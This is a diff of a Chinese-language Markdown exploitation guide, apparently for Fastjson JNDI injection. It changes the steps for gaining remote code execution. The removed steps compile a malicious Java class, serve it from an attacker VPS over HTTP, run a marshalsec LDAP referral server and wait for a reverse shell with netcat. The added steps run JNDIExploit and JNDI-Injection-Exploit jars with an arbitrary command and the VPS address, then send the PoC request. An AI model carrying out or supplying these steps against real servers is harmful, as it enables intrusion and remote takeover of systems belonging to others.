@@ -15,45 +15,18 @@
 
 使用json格式参数的POST请求，查看请求是否报错和返回结果。
 
-### 步骤二：准备要执行的 Java 恶意代码
-
-修改恶意类代码 [JNDIObject.java](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/JNDIObject.java) 并编译生成恶意类 JNDIObject.class
-
+### 步骤二：架设恶意类的 ldap 服务
+工具：[JNDIExploit-1.4-SNAPSHOT.jar](./file/JNDIExploit.v1.4.zip)
+地址：https://github.com/WhiteHSBG/JNDIExploit
 ```bash
-javac JNDIObject.java
+java -jar -jar JNDIExploit.jar -i VPS地址
 ```
-![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/image/javaCode.jpg)
-> ⚠️port为nc监听端口
-
-### 步骤三：搭建http服务传输恶意文件
-
-在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）
+工具：[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](./file/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar) 
 ```bash
-# 使用 python 快速开启 http server
-python2 -m SimpleHTTPServer 80
-python3 -m http.server 80
-```
-并将生成的 `JNDIObject.class` 文件拷贝到 该服务的根目录。
-
-### 步骤四：架设恶意类的 ldap 服务
-
-下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：
-
-```bash
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "执行命令" -A VPS地址 
 ```
 
-> ⚠️恶意类的ldap服务监听端口和poc中访问的接口一致
-
-### 步骤五：监听反弹 shell 的端口
-
-一般使用 nc 监听端口，等待反弹 shell
-
-```bash
-nc -lv 443
-```
-
-### 步骤六：修改请求包数据，发送poc
+### 步骤三：修改请求包数据，发送poc
 
 ```bash
 {
